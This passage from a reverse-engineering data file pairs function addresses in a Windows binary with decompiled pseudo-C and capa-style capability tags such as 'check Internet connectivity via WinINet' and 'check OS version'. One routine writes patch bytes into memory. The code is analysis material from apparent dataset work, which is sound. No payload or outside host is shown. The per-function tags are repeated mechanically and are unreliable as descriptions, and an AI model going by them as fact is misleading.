iVar2 = fcn.00049b64();\n            uVar5 = iVar2 - 1;\n            do {\n                LOCK();\n                bVar10 = uVar5 == *0x799a8;\n                *0x799a8 = *0x799a8 ^ bVar10 * (*0x799a8 ^ uVar5);\n            } while (!bVar10);\n        }\n    }\n    *arg2 = uVar4;\n    return uVar9;\n}\n",
        "token_count": 617
    },
    "0001ae70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0001ae70(void)\n\n{\n    uint64_t arg1;\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    int64_t arg1_00;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    int64_t noname_0;\n    uint64_t uStackX8;\n    ulong uStackX16;\n    ulong auStackX24 [2];\n    uchar auStack696 [32];\n    int64_t iStack664;\n    int32_t iStack504;\n    uint32_t uStack456;\n    \n    if (*0x799b0 == 0) {\n        uVar1 = (**0x115f0)();\n        if (uVar1 < 2) {\n            fcn.00050e08(auStack696);\n            fcn.0004f4b8(auStack696);\n            fcn.0004f4d8(auStack696, 0);\n            uVar6 = fcn.0004afbc(*(*0x64080 + 0x10), 0x11a90, &uStackX8);\n            arg1 = uStackX8;\n            if (uVar6 == 0) {\n                iVar5 = -(uStackX8 & 0xfff);\n                uVar8 = iVar5 + 0x1000;\n                uVar6 = fcn.0001a8b4(uStackX8, uVar8, 0, &uStackX16);\n                if (uVar6 == 0) {\n                    noname_0 = (arg1 & 0xfffffffffffff000) + 0x1000;\n                    iVar2 = fcn.0001a8b4(noname_0, 0x1000, 0, auStackX24);\n                    if (iVar2 == 0) {\n                        uVar8 = iVar5 + 0x2000;\n                    }\n                    arg1_00 = fcn.0002fbf0(0x60);\n                    uVar9 = uStackX8;\n                    if (arg1_00 == 0) {\n                        uVar6 = 0xc000009a;\n                    }\n                    else {\n                        fcn.0004f2e8(auStack696, uStackX8);\n                        while (iVar5 = fcn.00050e40(auStack696),  iVar5 != 0) {\n                            if (iStack504 == 0x1be) {\n                                uVar6 = 0;\n                                puVar10 = uVar9 + (arg1_00 - uStackX8);\n                                *0x799b0 = arg1_00;\n                                *puVar10 = 0xc6;\n                                puVar10[1] = 0x80;\n                                *(puVar10 + 2) = uVar8;\n                                puVar10[6] = 0;\n                                puVar10[7] = 0xc3;\n                                fcn.000619f6(arg1_00 + 0x30, arg1_00, 0x30);\n                                puVar10[0x36] = 1;\n                                *0x799b8 = arg1_00 + 0x30;\n                                goto code_r0x0001b005;\n                            }\n                            uVar3 = fcn.0004f4f0(auStack696);\n                            uVar6 = fcn.0004f4e8(auStack696);\n                            iVar7 = fcn.0004f4e0(auStack696);\n                            fcn.000619f6(arg1_00 + iVar7, uVar6, uVar3);\n                            uVar8 = uStack456;\n                            uVar4 = fcn.0004f4f0(auStack696);\n                            uVar9 = iStack664 - uVar4;\n                        }\n                        uVar6 = 0xc0000001;\n                        fcn.0002fc50(arg1_00);\n                    }\ncode_r0x0001b005:\n                    fcn.0001a924(arg1, uStackX16);\n                    if (iVar2 == 0) {\n                        fcn.0001a924(noname_0, auStackX24[0]);\n                    }\n                }\n            }\n        }\n        else {\n            uVar6 = 0xc0000001;\n        }\n    }\n    else {\n        uVar6 = 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 1004
    },
    "0001c660": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001c660(void)\n\n{\n    if (*0x79c88 != 0) {\n        fcn.00061ace(0x1c508, 1);\n        fcn.0001db50();\n        fcn.0005f8fc();\n        (*_fcn.000115b0)(*0x79c80);\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0001c710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001c710(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    ulong in_stack_00000038;\n    \n    if (*0x79ca8 == 0) {\n        uVar3 = fcn.00061ada();\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        pcVar4 = fcn.0005164c(*0x79ca8);\n        uVar2 = (*pcVar4)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038);\n        uVar3 = uVar2;\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "0001c7bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001c7bc(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    if (*0x79cb0 == 0) {\n        uVar3 = fcn.000619e4();\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        pcVar4 = fcn.0005164c(*0x79cb0);\n        uVar2 = (*pcVar4)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n        uVar3 = uVar2;\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 223
    },
    "0001c850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001c850(uint64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    \n    if (*0x79cb8 == 0) {\n        uVar3 = fcn.00061a98();\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        pcVar4 = fcn.0005164c(*0x79cb8);\n        uVar2 = (*pcVar4)(arg1, arg2, arg3, arg4);\n        uVar3 = uVar2;\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 190
    },
    "0001c8b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001c8b4(uint64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    \n    if (*0x79cc0 == 0) {\n        uVar3 = fcn.00061ae0();\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        pcVar4 = fcn.0005164c(*0x79cc0);\n        uVar2 = (*pcVar4)(arg1, arg2);\n        uVar3 = uVar2;\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 178
    },
    "000608c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000608c8(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *arg1_01;\n    int32_t iVar1;\n    \n    arg1_00 = *arg1;\n    fcn.0002f23c(0x87c48);\n    iVar1 = fcn.00058f70(arg1_00, 3);\n    if ((iVar1 == 0) || (arg1_01 = *arg1_00,  *(arg1_01 + 4) != 0)) {\n        fcn.0002f2a4(0x87c48);\n        *arg1 = NULL;\n    }\n    else {\n        *(arg1_01 + 4) = 1;\n        fcn.0002f2a4(0x87c48);\n        (**(**arg1_00 + 0x24))(arg1_00, arg2);\n        fcn.00031198(arg1_01 + 1);\n        fcn.0002f23c(0x87c48);\n        *arg1 = NULL;\n        fcn.00058ef0(arg1_00, 3);\n        fcn.0002f2a4(0x87c48);\n        (**(**arg1_00 + 0x2c))(arg1_00, arg2);\n        fcn.00031218(arg1_01 + 1);\n        fcn.0003105c(arg1_01 + 1);\n        fcn.0002f214(arg1_01 + 5);\n        fcn.0002fc50(arg1_01);\n    }\n    return;\n}\n",
        "token_count": 371
    },
    "0001d3a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001d3a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint32_t auStackX8 [8];\n    char *apcStack72 [5];\n    \n    apcStack72[0] = 0x11cc8;\n    apcStack72[1] = 0x11cc0;\n    apcStack72[2] = 0x11cb0;\n    apcStack72[3] = 0x11ca8;\n    *0x79f48 = fcn.00026a7c(6, 2);\n    uVar6 = 0;\n    if (*0x79f38 != 0) {\n        iVar9 = 0;\n        do {\n            fcn.0002fc50(*(iVar9 + *0x79f40));\n            uVar6 = uVar6 + 1;\n            iVar9 = iVar9 + 8;\n        } while (uVar6 < *0x79f38);\n    }\n    fcn.0002fc50(*0x79f40);\n    *0x79f40 = fcn.0002fbc4(0x20);\n    if (*0x79f40 == 0) {\n        return;\n    }\n    uVar6 = 0;\n    iVar9 = 0;\n    do {\n        pcVar8 = *(apcStack72 + iVar9);\n        uVar4 = 0xffffffffffffffff;\n        pcVar5 = pcVar8;\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = fcn.0002fbc4(~uVar4);\n        *(iVar9 + *0x79f40) = uVar3;\n        if (*(iVar9 + *0x79f40) == 0) {\n            *0x79f38 = uVar6;\n            return;\n        }\n        pcVar5 = *(iVar9 + *0x79f40);\n        do {\n            cVar1 = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            *pcVar5 = cVar1;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = uVar6 + 1;\n        iVar9 = iVar9 + 8;\n    } while (uVar6 < 4);\n    *0x79f38 = uVar6;\n    iVar2 = fcn.00026a28(7, 0, 0, auStackX8);\n    if (iVar2 != 0) {\n        return;\n    }\n    if (auStackX8[0] == 0) {\n        return;\n    }\n    pcVar8 = fcn.0002fbc4(auStackX8[0]);\n    if (pcVar8 == NULL) {\n        return;\n    }\n    iVar2 = 0;\n    cVar1 = *pcVar8;\n    pcVar7 = pcVar8;\n    pcVar5 = pcVar8;\n    while (cVar1 != '\\0') {\n        if ((cVar1 == ';') && (1 < pcVar7 - pcVar5)) {\n            pcVar5 = pcVar7 + 1;\n            iVar2 = iVar2 + 1;\n        }\n        pcVar7 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n    }\n    uVar4 = iVar2 + 2 << 3;\n    if (iVar2 + 2 == 0) {\n        fcn.0002fc50(*0x79f40);\n        *0x79f40 = 0;\n    }\n    else {\n        iVar9 = fcn.0002fbc4(uVar4);\n        if (iVar9 == 0) goto code_r0x0001d604;\n        uVar10 = 0x10;\n        if (uVar4 < 0x10) {\n            uVar10 = uVar4;\n        }\n        fcn.000619f6(iVar9, *0x79f40, uVar10);\n        fcn.0002fc50(*0x79f40);\n        *0x79f40 = iVar9;\n    }\n    cVar1 = *pcVar8;\n    pcVar7 = pcVar8;\n    pcVar5 = pcVar8;\n    while (cVar1 != '\\0') {\n        if ((*pcVar7 == ';') && (1 < pcVar7 - pcVar5)) {\n            *pcVar7 = '\\0';\n            auStackX8[0] = (pcVar7 - pcVar5) + 1;\n            uVar3 = fcn.0002fbc4(auStackX8[0]);\n            *(*0x79f40 + *0x79f38 * 8) = uVar3;\n            if (*(*0x79f40 + *0x79f38 * 8) != 0) {\n                fcn.000619f6(*(*0x79f40 + *0x79f38 * 8), pcVar5, auStackX8[0]);\n                fcn.00061af2();\n                *0x79f38 = *0x79f38 + 1;\n            }\n            pcVar5 = pcVar7 + 1;\n        }\n        pcVar7 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n    }\ncode_r0x0001d604:\n    fcn.0002fc50(pcVar8);\n    return;\n}\n",
        "token_count": 1316
    },
    "0001dc4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001dc4c(void)\n\n{\n    if (*0x7a1d6 != '\\0') {\n        *0x7a1d6 = '\\0';\n        fcn.0005c47c(*0x7a218);\n        fcn.00052250(0x7a218);\n        fcn.0005c47c(*0x7a208);\n        fcn.00052250(0x7a208);\n        fcn.0005c47c(*0x7a210);\n        fcn.00052250(0x7a210);\n        fcn.00017c28();\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0001e044": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001e044(ulong arg1, ulong arg2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int16_t *piVar10;\n    uchar auStack312 [280];\n    \n    iVar3 = 0;\n    if (*0x7a298 == 0) {\n        fcn.000287f0(0x7a130, 0x52);\n        uVar8 = 0xffffffffffffffff;\n        piVar10 = 0x7a130;\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            iVar1 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar1 != 0);\n        *0x7a298 = ~uVar8 - 1;\n        fcn.00028848(0x7a020, 0x52);\n        uVar8 = 0xffffffffffffffff;\n        piVar10 = 0x7a020;\n        do {\n            if (uVar8 == 0) break;\n            uVar8 = uVar8 - 1;\n            iVar1 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar1 != 0);\n        *0x79fe0 = ~uVar8 - 1;\n    }\n    iVar2 = fcn.00030254(arg1, 0x7a130, *0x7a298);\n    if ((iVar2 == 0) || (iVar2 = fcn.00030254(arg1, 0x7a020, *0x79fe0),  iVar2 == 0)) {\n        uVar4 = 1;\n        iVar3 = *0x79f48;\ncode_r0x0001e132:\n        if (iVar3 == 1) {\ncode_r0x0001e19f:\n            uVar4 = 1;\n        }\n        else if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else if (iVar3 == 2) {\n            uVar4 = 0;\n            iVar3 = fcn.00030f70(auStack312, 0x104);\n            if (iVar3 == 0) {\n                uVar4 = 1;\n            }\n            else {\n                fcn.00061af2(auStack312);\n                uVar7 = 0;\n                if (*0x79f38 != 0) {\n                    iVar9 = 0;\n                    do {\n                        iVar6 = fcn.00061af8(auStack312, *(iVar9 + *0x79f40));\n                        if (iVar6 != 0) goto code_r0x0001e19f;\n                        uVar7 = uVar7 + 1;\n                        iVar9 = iVar9 + 8;\n                    } while (uVar7 < *0x79f38);\n                }\n            }\n        }\n    }\n    else {\n        uVar4 = 0;\n        uVar8 = 0;\n        piVar5 = *0x79f30;\n        if (*0x79f28 != 0) {\n            do {\n                if (*piVar5 == arg2) {\n                    iVar3 = (*0x79f30)[uVar8 * 2 + 1];\n                    break;\n                }\n                uVar7 = uVar8 + 1;\n                uVar8 = uVar7;\n                piVar5 = piVar5 + 2;\n            } while (uVar7 < *0x79f28);\n            if (uVar8 < *0x79f28) goto code_r0x0001e132;\n        }\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 881
    },
    "0001e324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001e324(ulong arg1)\n\n{\n    char in_DL;\n    int64_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar auStackX24 [16];\n    \n    fcn.00031564(0x7a268, auStackX24, 1);\n    uVar3 = 0;\n    if (*0x7a280 != 0) {\n        iVar2 = 0;\n        iVar1 = *0x7a288;\n        uVar5 = *0x7a280;\n        do {\n            if (*(iVar2 + iVar1) == arg1) {\n                if ((in_DL != '\\0') && (*(iVar2 + 4 + iVar1) == '\\0')) break;\n                iVar4 = iVar2;\n                uVar6 = uVar3;\n                if (uVar3 < uVar5 - 1) {\n                    do {\n                        uVar6 = uVar6 + 1;\n                        *(iVar4 + iVar1) = *(iVar4 + 8 + iVar1);\n                        iVar4 = iVar4 + 8;\n                        iVar1 = *0x7a288;\n                        uVar5 = *0x7a280;\n                    } while (uVar6 < *0x7a280 - 1);\n                }\n                *0x7a280 = uVar5 - 1;\n                fcn.0003055c(0x7a288, uVar5 << 3, *0x7a280 << 3);\n                iVar1 = *0x7a288;\n                uVar5 = *0x7a280;\n            }\n            uVar3 = uVar3 + 1;\n            iVar2 = iVar2 + 8;\n        } while (uVar3 < uVar5);\n    }\n    fcn.00031598(0x7a268, auStackX24, 1);\n    return;\n}\n",
        "token_count": 443
    },
    "0001e428": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0001e428(ulong arg1, ulong *arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    ulong in_stack_00000028;\n    ulong *puStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    \n    bVar2 = false;\n    bVar1 = false;\n    uStack64 = 0;\n    uStack72 = 0;\n    uStack80 = 0;\n    if (*0x7a238 == NULL) {\n        return 0x21590001;\n    }\n    uStack88 = in_stack_00000028;\n    puStack104 = arg2;\n    uStack96 = arg3;\n    cVar3 = (**0x11240)();\n    if (cVar3 == '\\x01') {\n        uVar5 = CONCAT71(arg3 >> 8, 1);\n        iVar4 = fcn.0001a960(&puStack104, 8, uVar5, 2);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        bVar2 = true;\n        uVar5 = uVar5 & 0xffffffffffffff00 | 1;\n        iVar4 = fcn.0001a960(&uStack88, 8, uVar5, 2);\n        if (iVar4 != 0) goto code_r0x0001e57c;\n        bVar1 = true;\n        iVar4 = fcn.0001a960(&uStack96, 4, uVar5 & 0xffffffffffffff00 | 1, 2);\n        if (iVar4 == 0) goto code_r0x0001e51d;\ncode_r0x0001e568:\n        fcn.0001a9d8(uStack88, uStack72);\n    }\n    else {\ncode_r0x0001e51d:\n        iVar4 = (**0x7a238)(arg1, puStack104, uStack96, arg4, uStack88);\n        if (iVar4 == 0) {\n            *arg2 = *puStack104;\n        }\n        if (bVar1) {\n            fcn.0001a9d8(uStack96, uStack80);\n            goto code_r0x0001e568;\n        }\n    }\n    if (!bVar2) {\n        return iVar4;\n    }\ncode_r0x0001e57c:\n    fcn.0001a9d8(puStack104, uStack64);\n    return iVar4;\n}\n",
        "token_count": 598
    },
    "0001e59c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001e59c(uint64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    \n    if (*0x7a240 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        uVar2 = (**0x7a240)(arg1, arg2);\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 130
    },
    "0001e5e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0001e5e8(ulong *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    int32_t iVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    uint *in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    uchar in_stack_00000040;\n    uint *puStack152;\n    ulong *puStack144;\n    ulong uStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    \n    uStack80 = 0;\n    uStack96 = 0;\n    uStack104 = 0;\n    uStack112 = 0;\n    uStack88 = 0;\n    bVar8 = false;\n    bVar7 = false;\n    bVar5 = false;\n    bVar4 = false;\n    if (*0x7a250 == NULL) {\n        return 0x21590001;\n    }\n    uStack136 = in_stack_00000030;\n    puStack152 = in_stack_00000028;\n    uStack128 = in_stack_00000038;\n    iVar12 = arg3;\n    puStack144 = arg1;\n    iStack120 = arg3;\n    cVar10 = (**0x11240)();\n    bVar9 = false;\n    if (cVar10 != '\\x01') goto code_r0x0001e773;\n    uVar13 = CONCAT71(iVar12 >> 8, 1);\n    iVar11 = fcn.0001a960(&puStack144, 8, uVar13, 2);\n    if (iVar11 != 0) {\n        return iVar11;\n    }\n    bVar8 = true;\n    bVar9 = true;\n    if (in_stack_00000028 != NULL) {\n        uVar13 = uVar13 & 0xffffffffffffff00 | 1;\n        iVar11 = fcn.0001a960(&puStack152, 0x10, uVar13, 2);\n        if (iVar11 != 0) goto code_r0x0001e83e;\n        bVar7 = true;\n    }\n    uVar13 = CONCAT71(uVar13 >> 8, 1);\n    iVar11 = fcn.0001a960(&uStack136, 0x2a0, uVar13, 0);\n    if (iVar11 == 0) {\n        bVar6 = true;\n        uVar13 = uVar13 & 0xffffffffffffff00 | 1;\n        iVar11 = fcn.0001a960(&uStack128, 0x28, uVar13, 0);\n        bVar9 = bVar8;\n        if (iVar11 == 0) {\n            bVar5 = true;\n            bVar9 = true;\n            if (arg3 == 0) {\ncode_r0x0001e773:\n                bVar6 = bVar9;\n                iVar11 = (**0x7a250)(puStack144, arg2, iStack120, arg4, puStack152, uStack136, uStack128, \n                                     in_stack_00000040);\n                if ((iVar11 == 0) && (*arg1 = *puStack144,  in_stack_00000028 != NULL)) {\n                    uVar1 = puStack152[1];\n                    uVar2 = puStack152[2];\n                    uVar3 = puStack152[3];\n                    *in_stack_00000028 = *puStack152;\n                    in_stack_00000028[1] = uVar1;\n                    in_stack_00000028[2] = uVar2;\n                    in_stack_00000028[3] = uVar3;\n                }\n                if (bVar4) {\n                    fcn.0001a9d8(iStack120, uStack88);\n                }\n                bVar9 = bVar8;\n                if (bVar5) goto code_r0x0001e802;\n            }\n            else {\n                iVar11 = fcn.0001a960(&iStack120, 0x30, uVar13 & 0xffffffffffffff00 | 1, 2);\n                if (iVar11 == 0) {\n                    bVar4 = true;\n                    goto code_r0x0001e773;\n                }\ncode_r0x0001e802:\n                fcn.0001a9d8(uStack128, uStack112);\n                bVar9 = bVar8;\n            }\n            if (!bVar6) goto code_r0x0001e825;\n        }\n        fcn.0001a9d8(uStack136, uStack104);\n    }\ncode_r0x0001e825:\n    if (bVar7) {\n        fcn.0001a9d8(puStack152, uStack96);\n    }\n    if (!bVar9) {\n        return iVar11;\n    }\ncode_r0x0001e83e:\n    fcn.0001a9d8(puStack144, uStack80);\n    return iVar11;\n}\n",
        "token_count": 1201
    },
    "0001e868": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001e868(uint64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    \n    if (*0x7a248 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        uVar2 = (**0x7a248)(arg1, arg2);\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 129
    },
    "0001e8b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001e8b0(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uchar in_R9B;\n    \n    if (*0x7a220 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        uVar2 = (**0x7a220)(arg1, arg2, arg3, in_R9B);\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 150
    },
    "0001e90c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0001e90c(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    \n    if (*0x7a228 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        uVar2 = (**0x7a228)(arg1, arg2, arg3);\n        fcn.0001b08c(arg1 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 137
    },
    "0002f458": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0002f458(uint64_t *arg1)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = *arg1;\n    if (*0x7a230 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b08c(0);\n        uVar2 = (**0x7a230)(uVar3, 0);\n        fcn.0001b08c(uVar3 & 0xffffffffffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 145
    },
    "0001e9a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
